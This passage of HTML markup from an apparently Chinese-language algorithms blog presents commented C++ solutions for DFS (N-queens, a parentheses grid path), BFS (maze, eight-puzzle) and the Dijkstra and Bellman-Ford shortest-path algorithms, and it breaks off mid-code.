class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;bits/stdc++.h&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-type">const</span> <span class="hljs-type">int</span> N =<span class="hljs-number">20</span>;<br><span class="hljs-type">bool</span> col[N],dg[N],udg[N];<span class="hljs-comment">//分别标记列，对角和反对角线</span><br><span class="hljs-type">int</span> n;<br><span class="hljs-type">char</span> g[N][N];<span class="hljs-comment">//存储图</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">dfs</span><span class="hljs-params">(<span class="hljs-type">int</span> u)</span><span class="hljs-comment">//函数按行进行枚举搜索。</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">if</span>(u==n)<span class="hljs-comment">//如果搜索到第n行。</span><br>    &#123;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;n;i++)<span class="hljs-comment">//输出可能的结果</span><br>        &#123;<br>            <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j=<span class="hljs-number">0</span>;j&lt;n;j++)<br>            &#123;<br>                cout&lt;&lt;g[i][j];<br>            &#125;<br>            cout&lt;&lt;endl;<br>        &#125;<br>        cout&lt;&lt;endl;<br>    &#125;<br>    <span class="hljs-comment">//枚举第u行,第i列</span><br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;n;i++)<br>    &#123;<br>        <span class="hljs-keyword">if</span>(!col[i] &amp;&amp; !dg[u+i] &amp;&amp; !udg[n-u+i])<span class="hljs-comment">//如果该列，该对角线，该反对角线都没有皇后，则可以放入皇后</span><br>        &#123;<br>            g[u][i] = <span class="hljs-string">&#x27;Q&#x27;</span>;<span class="hljs-comment">//放入皇后</span><br>    <span class="hljs-comment">//更新状态</span><br>            col[i] =<span class="hljs-literal">true</span>;<br>            dg[u+i] = <span class="hljs-literal">true</span>;<br>            udg[n-u+i] = <span class="hljs-literal">true</span>;<br>            <span class="hljs-built_in">dfs</span>(u+<span class="hljs-number">1</span>);<span class="hljs-comment">//对下一行进行搜索</span><br>    <span class="hljs-comment">//回溯</span><br>            col[i] =<span class="hljs-literal">false</span>;<br>            dg[u+i] = <span class="hljs-literal">false</span>;<br>            udg[n-u+i] = <span class="hljs-literal">false</span>;<br>            g[u][i]=<span class="hljs-string">&#x27;.&#x27;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span></span><br><span class="hljs-function"></span>&#123;<br>    cin&gt;&gt;n;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;n;i++)<br>    &#123;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j=<span class="hljs-number">0</span>;j&lt;n;j++)<br>        &#123;<br>            g[i][j]=<span class="hljs-string">&#x27;.&#x27;</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-built_in">dfs</span>(<span class="hljs-number">0</span>);<br>    <br>    <br>&#125;<br></code></pre></td></tr></table></figure><p>在搜索路径时，应注意剪纸枝来提算法效率，有时需要多次剪枝。<br>例：<a href="https://leetcode-cn.com/problems/check-if-there-is-a-valid-parentheses-string-path/">https://leetcode-cn.com/problems/check-if-there-is-a-valid-parentheses-string-path/</a><br>代码</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-type">int</span> m,n,c;<span class="hljs-comment">//c表示当前括号状态，c&gt;=0均为合法状态</span><br>    <span class="hljs-type">bool</span> flag;<br>    <span class="hljs-type">bool</span> vis[<span class="hljs-number">101</span>][<span class="hljs-number">101</span>][<span class="hljs-number">201</span>];<br>    <span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">dfs</span><span class="hljs-params">(vector&lt;vector&lt;<span class="hljs-type">char</span>&gt;&gt;&amp; grid,<span class="hljs-type">int</span> x,<span class="hljs-type">int</span> y)</span></span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-comment">//cout&lt;&lt;x&lt;&lt;&quot; &quot;&lt;&lt;y&lt;&lt;endl;</span><br>        <span class="hljs-keyword">if</span> (c &gt; m - x + n - y - <span class="hljs-number">1</span>) <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<span class="hljs-comment">//当剩下的路径都不足以抵消c时，必然不成立，返回，剪枝</span><br>        <span class="hljs-keyword">if</span>(x==m<span class="hljs-number">-1</span> &amp;&amp; y==n<span class="hljs-number">-1</span> &amp;&amp; c==<span class="hljs-number">0</span>)<span class="hljs-comment">//搜索成功状态。</span><br>        &#123;<br>            flag =<span class="hljs-literal">true</span>;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>        &#125;<br>        <span class="hljs-keyword">if</span>(vis[x][y][c]) <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<span class="hljs-comment">//由x,y,c确定的唯一状态已被搜索过，返回，剪枝</span><br>        vis[x][y][c]=<span class="hljs-number">1</span>;<br>        <span class="hljs-keyword">if</span>((x+<span class="hljs-number">1</span>)&lt;m &amp;&amp; !flag)<br>        &#123;<br>            <span class="hljs-keyword">if</span>(grid[x+<span class="hljs-number">1</span>][y]==<span class="hljs-string">&#x27;(&#x27;</span> &amp;&amp; !flag)<span class="hljs-comment">//若已有路径搜索到终点，返回，剪枝，下面分支皆是该策略。</span><br>            &#123;<br>                ++c;<br>                <span class="hljs-keyword">if</span>(c&gt;=<span class="hljs-number">0</span>)<br>                &#123;<br>                    <span class="hljs-built_in">dfs</span>(grid,x+<span class="hljs-number">1</span>,y);<br>                &#125;<br>                --c;<span class="hljs-comment">//回溯</span><br>            &#125;<br>            <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(grid[x+<span class="hljs-number">1</span>][y]==<span class="hljs-string">&#x27;)&#x27;</span> &amp;&amp; !flag)<br>            &#123;<br>                --c;<br>                <span class="hljs-keyword">if</span>(c&gt;=<span class="hljs-number">0</span>)<br>                &#123;<br>                    <span class="hljs-built_in">dfs</span>(grid,x+<span class="hljs-number">1</span>,y);<br>                &#125;<br>                ++c;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">if</span>((y+<span class="hljs-number">1</span>)&lt;n &amp;&amp; !flag)<br>        &#123;<br>            <span class="hljs-keyword">if</span>(grid[x][y+<span class="hljs-number">1</span>]==<span class="hljs-string">&#x27;(&#x27;</span> &amp;&amp; !flag)<br>            &#123;<br>                ++c;<br>                <span class="hljs-keyword">if</span>(c&gt;=<span class="hljs-number">0</span>)<br>                &#123;<br>                    <span class="hljs-built_in">dfs</span>(grid,x,y+<span class="hljs-number">1</span>);<br>                &#125;<br>                --c;<br>            &#125;<br>            <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(grid[x][y+<span class="hljs-number">1</span>]==<span class="hljs-string">&#x27;)&#x27;</span> &amp;&amp; !flag)<br>            &#123;<br>                --c;<br>                <span class="hljs-keyword">if</span>(c&gt;=<span class="hljs-number">0</span> &amp;&amp; !flag)<br>                &#123;<br>                     <span class="hljs-built_in">dfs</span>(grid,x,y+<span class="hljs-number">1</span>);<br>                &#125;<br>                ++c;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">hasValidPath</span><span class="hljs-params">(vector&lt;vector&lt;<span class="hljs-type">char</span>&gt;&gt;&amp; grid)</span> </span>&#123;<br>        flag =<span class="hljs-literal">false</span>;<br>        m=grid.<span class="hljs-built_in">size</span>();<br>        n=grid[<span class="hljs-number">0</span>].<span class="hljs-built_in">size</span>();<br>        <span class="hljs-keyword">if</span>(grid[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>]==<span class="hljs-string">&#x27;)&#x27;</span> || grid[m<span class="hljs-number">-1</span>][n<span class="hljs-number">-1</span>]==<span class="hljs-string">&#x27;(&#x27;</span> || (m+n)%<span class="hljs-number">2</span>==<span class="hljs-number">0</span>)<br>        &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<span class="hljs-comment">//剪枝，起始为&#x27;)&#x27;，终点为&#x27;(&#x27;。均不满足要求。</span><br>      <span class="hljs-comment">//此外，从左上角走到右下角，走过的长度为m+n-1,要求括号闭合，再次剪枝</span><br>        &#125;<br>        <span class="hljs-built_in">memset</span>(vis,<span class="hljs-number">0</span>,<span class="hljs-built_in">sizeof</span>(vis));<br>        c=<span class="hljs-number">1</span>;<br>        <span class="hljs-built_in">dfs</span>(grid,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>);<br>        <span class="hljs-keyword">if</span>(flag)<br>        &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>        &#125;<br>        <span class="hljs-keyword">else</span> <br>        &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h3 id="广度优先搜索"><a href="#广度优先搜索" class="headerlink" title="广度优先搜索"></a>广度优先搜索</h3><p>广度优先搜索一般都借助队列这一数据结构，有一些固定的模式。<br>走迷宫。<br><a href="https://www.acwing.com/activity/content/problem/content/907/">https://www.acwing.com/activity/content/problem/content/907/</a></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;bits/stdc++.h&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-type">const</span> <span class="hljs-type">int</span> N =<span class="hljs-number">105</span>;<br><span class="hljs-type">int</span> a[N][N];<br><span class="hljs-type">int</span> dis[N][N];<span class="hljs-comment">//存储到起点的距离</span><br><span class="hljs-comment">//设置搜索方向</span><br><span class="hljs-type">int</span> dx[<span class="hljs-number">4</span>] = &#123;<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">-1</span>&#125;;<br><span class="hljs-type">int</span> dy[<span class="hljs-number">4</span>] = &#123;<span class="hljs-number">1</span>,<span class="hljs-number">-1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>&#125;;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">int</span> n,m;<br>    cin&gt;&gt;n&gt;&gt;m;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;n;i++)<br>    &#123;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j=<span class="hljs-number">0</span>;j&lt;m;j++)<br>        &#123;<br>            cin&gt;&gt;a[i][j];<br>        &#125;<br>    &#125;<br>    queue&lt;pair&lt;<span class="hljs-type">int</span>,<span class="hljs-type">int</span>&gt;&gt;q;<br>    q.<span class="hljs-built_in">push</span>(&#123;<span class="hljs-number">0</span>,<span class="hljs-number">0</span>&#125;);<span class="hljs-comment">//放入起点</span><br>    <span class="hljs-built_in">memset</span>(dis,<span class="hljs-number">-1</span>,<span class="hljs-built_in">sizeof</span>(dis));<br>    <span class="hljs-keyword">while</span>(!q.<span class="hljs-built_in">empty</span>())<br>    &#123;<br>        <span class="hljs-keyword">auto</span> [x,y] = q.<span class="hljs-built_in">front</span>();<span class="hljs-comment">//弹出要搜索的点</span><br>        q.<span class="hljs-built_in">pop</span>();<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">4</span>;i++)<span class="hljs-comment">//对四个方向进行搜索</span><br>        &#123;<br>                <span class="hljs-type">int</span> nx =x+dx[i];<br>                <span class="hljs-type">int</span> ny =y+dy[i];<br>                <span class="hljs-keyword">if</span>(nx&gt;=<span class="hljs-number">0</span> &amp;&amp; nx&lt;n&amp;&amp;ny&gt;=<span class="hljs-number">0</span> &amp;&amp; ny&lt;m &amp;&amp; a[nx][ny]==<span class="hljs-number">0</span> &amp;&amp; dis[nx][ny]==<span class="hljs-number">-1</span>)<span class="hljs-comment">//判断是否越界，为墙，还没有搜索过</span><br>                &#123;<br>                    q.<span class="hljs-built_in">push</span>(&#123;nx,ny&#125;);<span class="hljs-comment">//放入队列，等待搜索</span><br>                    dis[nx][ny] = dis[x][y]+<span class="hljs-number">1</span>;<span class="hljs-comment">//更新距离。</span><br>                &#125;<br>        &#125;   <br>    &#125;<br>    cout&lt;&lt;dis[n<span class="hljs-number">-1</span>][m<span class="hljs-number">-1</span>]+<span class="hljs-number">1</span>;<br>    <br>&#125;<br></code></pre></td></tr></table></figure><p>八数码<br><a href="https://www.acwing.com/problem/content/847/">https://www.acwing.com/problem/content/847/</a></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;bits/stdc++.h&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br>unordered_map&lt;string,<span class="hljs-type">int</span>&gt;d;<span class="hljs-comment">//映射字符串状态到输入状态的距离</span><br>queue&lt;string&gt;q;<span class="hljs-comment">//搜索的队列</span><br><span class="hljs-type">int</span> dx[<span class="hljs-number">4</span>]=&#123;<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">-1</span>&#125;;<span class="hljs-comment">//搜索方向</span><br><span class="hljs-type">int</span> dy[<span class="hljs-number">4</span>]=&#123;<span class="hljs-number">1</span>,<span class="hljs-number">-1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>&#125;;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">bfs</span><span class="hljs-params">(string start)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-comment">//cout&lt;&lt;1&lt;&lt;endl;</span><br>    q.<span class="hljs-built_in">push</span>(start);<span class="hljs-comment">//将开始的搜索状态放入。</span><br>    d[start]=<span class="hljs-number">0</span>;<br>    string endstate = <span class="hljs-string">&quot;12345678x&quot;</span>;<span class="hljs-comment">//最终的搜索状态</span><br>    <span class="hljs-keyword">while</span>(!q.<span class="hljs-built_in">empty</span>())<br>    &#123;<br>        string t= q.<span class="hljs-built_in">front</span>();<br>        q.<span class="hljs-built_in">pop</span>();<br>        <span class="hljs-type">int</span> dis =d[t];<br>        <span class="hljs-keyword">if</span>(t==endstate) <span class="hljs-comment">//如果搜索到了最终状态，返回距离</span><br>        &#123;<br>            <span class="hljs-keyword">return</span>  dis;<br>        &#125;<br>        <span class="hljs-type">int</span> k = t.<span class="hljs-built_in">find</span>(<span class="hljs-string">&#x27;x&#x27;</span>);<span class="hljs-comment">//找到x的位置</span><br>        <span class="hljs-type">int</span> x = k/<span class="hljs-number">3</span>;<span class="hljs-comment">//转移到2维上</span><br>        <span class="hljs-type">int</span> y = k%<span class="hljs-number">3</span>;<span class="hljs-comment">//转移到2维上</span><br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">4</span>;i++)<span class="hljs-comment">//在二维上进行搜索</span><br>        &#123;<br>            <span class="hljs-type">int</span> nx = x+dx[i];<br>            <span class="hljs-type">int</span> ny = y+dy[i];<br>            <span class="hljs-keyword">if</span>(nx&gt;=<span class="hljs-number">0</span> &amp;&amp; nx&lt;<span class="hljs-number">3</span> &amp;&amp; ny&gt;=<span class="hljs-number">0</span> &amp;&amp; ny&lt;<span class="hljs-number">3</span>)<span class="hljs-comment">//判断是否越界</span><br>            &#123;<br>                <span class="hljs-built_in">swap</span>(t[k],t[<span class="hljs-number">3</span>*nx+ny]);<span class="hljs-comment">//向下一个状态进行移动</span><br>                <span class="hljs-keyword">if</span>(!d.<span class="hljs-built_in">count</span>(t))<span class="hljs-comment">//如果还没有搜索到</span><br>                &#123;<br>                    d[t] =dis+<span class="hljs-number">1</span>;<span class="hljs-comment">//更新距离</span><br>                    q.<span class="hljs-built_in">push</span>(t);<span class="hljs-comment">//进行下一步搜索</span><br>                &#125;<br>                <span class="hljs-built_in">swap</span>(t[<span class="hljs-number">3</span>*nx+ny],t[k]);<span class="hljs-comment">//回溯。</span><br>            &#125;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    <br>    <br>&#125;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span></span><br><span class="hljs-function"></span>&#123;<br>    string start;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">9</span>;i++)<br>    &#123;<br>        <span class="hljs-type">char</span> c;<br>        cin&gt;&gt;c;<br>        start+=c;<br>    &#125;<br>    <span class="hljs-comment">//cout&lt;&lt;&quot;start:&quot;&lt;&lt;start&lt;&lt;endl;</span><br>    cout&lt;&lt;<span class="hljs-built_in">bfs</span>(start)&lt;&lt;endl;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>算法</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Dijkstra算法</title>
    <link href="/2022/12/30/%E8%BF%AA%E6%9D%B0%E6%96%AF%E7%89%B9%E6%8B%89/"/>
    <url>/2022/12/30/%E8%BF%AA%E6%9D%B0%E6%96%AF%E7%89%B9%E6%8B%89/</url>
    
    <content type="html"><![CDATA[<p>Dijkstra算法是一种最短路径路由算法,用于求单源最短路径，但其要求边权不能为负值。<br>bellman-ford算法也是用来去单源最短路径，但是其边权可以负值。<br>spfa算法为bellman-ford的算法的优化版本，在有些情况下能够实现较小的时间复杂度。<br>核心实现部分。<br>Dijkstra:利用贪心的思想，每次加入最近的未访问节点，从而得到最短路径。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">dijkstra</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-comment">//所有节点距离起点的距离初始化为无穷大</span><br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">1</span>;i&lt;=n;i++)<br>    &#123;<br>        dist[i] = inf;<br>    &#125;<br>    <span class="hljs-comment">//起点距离自己的距离为零</span><br>    dist[<span class="hljs-number">1</span>] = <span class="hljs-number">0</span>;<br><br>    <span class="hljs-comment">//迭代n次，每次可以确定一个点到起点的最短路</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; n; ++i) &#123;<br>        <span class="hljs-type">int</span> t = <span class="hljs-number">-1</span>;<br>        <span class="hljs-comment">//t的作用？</span><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">1</span>; j &lt;= n; ++j) &#123;<br>            <span class="hljs-comment">//不在s集合，并且</span><br>            <span class="hljs-comment">//如果没有更新过，则进行更新， 或者发现更短的路径，则进行更新</span><br>            <span class="hljs-keyword">if</span> (!st[j] &amp;&amp; (t == <span class="hljs-number">-1</span> || dist[j] &lt; dist[t])) &#123;<br>                t = j;<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-comment">//加入到s集合中</span><br>        st[t] = <span class="hljs-literal">true</span>;<br><br>        <span class="hljs-comment">//找到了距离最小的点t，并用最小的点t去更新其他的点到起点的距离</span><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">1</span>; j &lt;= n; ++j) &#123;<br>            dist[j] = <span class="hljs-built_in">min</span>(dist[j], dist[t] + g[t][j]);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">// 如果起点到达不了n号节点，则返回-1</span><br>    <span class="hljs-keyword">if</span> (dist[n] == inf) <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    <span class="hljs-comment">// 返回起点距离n号节点的最短距离</span><br>    <span class="hljs-keyword">return</span> dist[n];<br>&#125;<br></code></pre></td></tr></table></figure><p>Dijkstra 还可以进行堆优化，可使用STL优先队列。<br>从O(n2)优化为O(nlogn)</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">dijstrkual</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    dist[<span class="hljs-number">1</span>] =<span class="hljs-number">0</span>;<br>    pq.<span class="hljs-built_in">push</span>(&#123;<span class="hljs-number">0</span>,<span class="hljs-number">1</span>&#125;);<br>    <span class="hljs-keyword">while</span>(!pq.<span class="hljs-built_in">empty</span>())<br>    &#123;<br>        <span class="hljs-keyword">auto</span> t = pq.<span class="hljs-built_in">top</span>();<br>        pq.<span class="hljs-built_in">pop</span>();<br>        <span class="hljs-type">int</span> distance = t.first;<br>        <span class="hljs-type">int</span> u = t.second;<br>        <span class="hljs-keyword">if</span>(vis[u])<span class="hljs-keyword">continue</span>;<br>        <span class="hljs-keyword">else</span> vis[u] = <span class="hljs-literal">true</span>;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-keyword">auto</span>&amp;v:gra[u])<br>        &#123;<br>            <span class="hljs-type">int</span> y = v.first;<br>            <span class="hljs-type">int</span> d = v.second;<br>            <span class="hljs-keyword">if</span>(dist[y]&gt;distance+d)<br>            &#123;<br>                dist[y] = distance+d;<br>                pq.<span class="hljs-built_in">push</span>(&#123;dist[y],y&#125;);<br>            &#125;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> dist[n];<br>&#125;<br></code></pre></td></tr></table></figure><p>bellman-ford:循环遍历图中的所有边，对图中的边进行松弛操作，从而得到可能的最短路径。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">bellman_ford</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    dist[<span class="hljs-number">1</span>]=<span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;k;i++)<span class="hljs-comment">//第次i松弛操作保证了所有深度为i的路径最短</span><br>    &#123;<br>        vector&lt;<span class="hljs-type">int</span>&gt;last = dist;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j=<span class="hljs-number">0</span>;j&lt;=m;j++)<br>        &#123;<br>            <span class="hljs-type">int</span> a = 